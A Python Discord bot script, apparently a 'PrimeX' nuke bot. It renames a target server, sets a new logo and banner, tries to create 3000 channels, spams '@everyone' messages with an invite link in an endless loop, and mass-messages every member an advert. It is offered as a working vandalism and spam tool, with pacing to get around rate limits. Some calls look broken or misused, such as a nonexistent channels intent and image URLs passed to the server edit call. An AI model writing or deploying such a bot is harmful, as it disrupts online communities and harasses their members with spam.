import discord
from discord.ext import commands, tasks
import asyncio
import random
import os

# Configuration
SERVER_NAME = "Nuked by PrimeX"
CHANNEL_PREFIX = "Nuked By PrimeX"
SERVER_LOGO_URL = "https://cdn.discordapp.com/attachments/1545360223374413907/1545371272702074951/primex_bots_logo.jpg?ex=6a9e89a7&is=6a9d3827&hm=9f622caf029baf4ef2211b67977542fc0894e49517da747b90e80e40e5a72522"
SERVER_BANNER_URL = "https://cdn.discordapp.com/attachments/1545360223374413907/1545371463559680081/Prime_x.png?ex=6a9e89d4&is=6a9d3854&hm=8cfae69aa006d97b906d8cec6a04dfb1e49cab0b5cb5ad5771853960eeeba54d"
NUKE_INVITE_URL = "https://discord.gg/UZgk9gDSx"
DM_MESSAGE = f"Best Nuke Bot Provider is PrimeX\nJoin here: {NUKE_INVITE_URL}"

# Read Token from Environment Variable or use default placeholder
BOT_TOKEN = os.environ.get("DISCORD_TOKEN", "YOUR_DEFAULT_TOKEN_PLACEHOLDER")

class ExtremeNukeBot(commands.Bot):
    def __init__(self):
        # Expanded intents to ensure all data (members, channels) is cached correctly
        intents = discord.Intents.default()
        intents.messages = True
        intents.message_content = True
        intents.members = True      # Required for fetching members
        intents.guilds = True       # Required for guild updates
        intents.channels = True     # Required for channel management
        intents.voice_states = True

        super().__init__(command_prefix='!', intents=intents)

    async def setup_hook(self):
        print(f"Logged in as {self.user}")

    @commands.Cog.listener()
    async def on_ready(self):
        # FIX: Use self.guilds[0] to be safe, or check if self.guild exists
        if not self.guilds:
            print("Warning: No guilds found.")
            return

        # Get the first guild (since this is a nuke bot for a specific server)
        target_guild = self.guilds[0]

        print(f"Nuke Bot Ready! Server: {target_guild.name}")
        # Store reference to self.guild just in case, though we'll use target_guild mostly
        self.target_guild = target_guild 

    @commands.command(name="nuke", description="Start the extreme nuke process")
    async def start_nuke(self, ctx):
        # Use self.target_guild or fallback to self.guilds[0]
        guild = getattr(self, 'target_guild', self.guilds[0])

        if NukeTask.is_running():
            return await ctx.send("Nuke is already running!")

        # 1. Set Server Info
        try:
            await guild.edit(name=SERVER_NAME)
            await guild.edit(icon_url=SERVER_LOGO_URL)
            await guild.edit(banner_url=SERVER_BANNER_URL)
            print("Server info updated.")
        except discord.HTTPException as e:
            print(f"Error setting server info: {e}")

        # 2. Start Background Tasks, passing the guild instance
        NukeTask.start(guild)
        DM_Task.start(self)

        await ctx.send(f"Nuke started! Creating channels and spamming...")

    @commands.command(name="stopnuke", description="Stop the nuke process")
    async def stop_nuke(self, ctx):
        if not NukeTask.is_running():
            return await ctx.send("Nuke is already stopped!")

        NukeTask.stop()
        DM_Task.stop()
        await ctx.send("Nuke stopped!")

class NukeTask:
    _running = False

    @classmethod
    def start(cls, guild):
        cls._running = True
        cls.guild_instance = guild # Store reference
        asyncio.create_task(cls.run_nuke_loop(guild))

    @classmethod
    def stop(cls):
        cls._running = False

    @classmethod
    async def run_nuke_loop(cls, guild):
        # Phase 1: Create Thousands of Channels
        print("Creating thousands of channels...")
        try:
            # Create 3000 channels. Discord rate limits are handled by the sleep.
            for i in range(3000):  
                name = f"{CHANNEL_PREFIX} {i}"
                await guild.create_text_channel(name=name)

                # Rate limit handling
                if i % 50 == 0:
                    await asyncio.sleep(1.0)
                elif i % 10 == 0:
                    await asyncio.sleep(0.5)
                else:
                    await asyncio.sleep(0.1)

            print("Channel creation phase complete.")
        except discord.HTTPException as e:
            print(f"HTTP Exception during channel creation: {e}")
        except Exception as e:
            print(f"Error during channel creation: {e}")

        # Phase 2: Infinite Spam Loop
        print("Starting infinite spam loop...")
        while cls._running:
            # Ensure guild hasn't been deleted or gone offline
            if not hasattr(guild, 'channels'):
                await asyncio.sleep(5)
                continue

            channels = [c for c in guild.channels if isinstance(c, discord.TextChannel)]

            if not channels:
                await asyncio.sleep(5)
                continue

            target_channel = random.choice(channels)

            try:
                msg_content = f"@everyone Nuked BY PrimeX {NUKE_INVITE_URL}"
                await target_channel.send(msg_content)

            except discord.HTTPException as e:
                # Handle specific rate limits gracefully
                if "rate_limit_per_user" in str(e).lower() or "Too Many Requests" in str(e):
                    await asyncio.sleep(1.5)
                else:
                    print(f"Spam error in {target_channel.name}: {e}")
                    await asyncio.sleep(1.0)

            except Exception as e:
                print(f"Unknown spam error: {e}")
                await asyncio.sleep(1.0)

            # Variable delay to prevent CPU hogging and respect rate limits globally
            await asyncio.sleep(random.uniform(0.2, 0.8))


class DM_Task:
    _running = False

    @classmethod
    def start(cls, bot):
        cls._running = True
        asyncio.create_task(cls.run_dm_loop(bot))

    @classmethod
    def stop(cls):
        cls._running = False

    @classmethod
    async def run_dm_loop(cls, bot):
        print("Starting DM loop to all members...")
        while cls._running:
            guild = getattr(bot, 'target_guild', bot.guilds[0])

            if not guild:
                await asyncio.sleep(1)
                continue

            try:
                # Fetch members in batches to avoid memory spikes and rate limits
                async for member in guild.fetch_members(limit=1000):
                    if cls._running:
                        try:
                            await member.send(DM_MESSAGE)
                            # Small delay to avoid DM floods/rate limits
                            await asyncio.sleep(0.05)
                        except discord.Forbidden:
                            pass 
                        except discord.HTTPException as e:
                            print(f"DM error for {member.name}: {e}")
                    else:
                        break
            except Exception as e:
                print(f"Error iterating members: {e}")

            if cls._running:
                # Pause between batches of DMs
                await asyncio.sleep(1.0)

# Initialize and run
bot = ExtremeNukeBot()

if __name__ == "__main__":
    try:
        bot.run(BOT_TOKEN)
    except KeyboardInterrupt:
        print("Bot stopped by user.")
    except discord.errors.LoginFailure as e:
        print(f"Failed to login. Check your token.\n{e}")
    except Exception as e:
        print(f"Unexpected error: {e}")
